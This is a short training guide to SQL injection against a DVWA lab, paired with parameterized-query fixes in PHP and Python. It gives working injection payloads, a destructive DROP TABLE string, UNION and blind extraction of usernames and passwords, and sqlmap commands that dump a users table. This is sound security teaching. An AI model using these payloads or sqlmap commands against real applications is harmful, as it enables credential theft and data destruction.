# SQL injection — attack techniques and defense

Test every input field that might touch a database. Use your DVWA lab.

## Basic test payloads

```
'                          -- triggers syntax error if injectable
' OR '1'='1                -- always-true condition
' OR 1=1--                 -- comment out rest of query (MySQL/MSSQL)
' OR 1=1#                  -- comment out rest (MySQL)
'; DROP TABLE users;--     -- destructive (do not use outside lab)
```

## UNION-based injection

```sql
-- Step 1: find number of columns
' ORDER BY 1--    -- increment until error: reveals column count

-- Step 2: find visible column
' UNION SELECT NULL,NULL--

-- Step 3: extract data
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

## Boolean-blind injection

```sql
-- True condition — page loads normally
' AND 1=1--

-- False condition — page behaves differently (empty result, error, redirect)
' AND 1=2--

-- Extract data one char at a time
' AND SUBSTRING(username,1,1)='a' FROM users WHERE username='admin'--
```

## Automated with sqlmap

```bash
# Basic scan against DVWA SQLi module
# (set DVWA security to Low first, get your PHPSESSID from browser cookies)
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=yoursessionid" \
  --dbs

# Dump a specific table
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=yoursessionid" \
  -D dvwa -T users --dump
```

## Defense — parameterized queries

```php
// Vulnerable
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// Fixed — parameterized query (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

```python
# Vulnerable
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

# Fixed
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

## Practice

PortSwigger SQL injection labs (17 labs, Apprentice + Practitioner):
https://portswigger.net/web-security/sql-injection

DVWA SQL Injection and SQL Injection (Blind) modules.
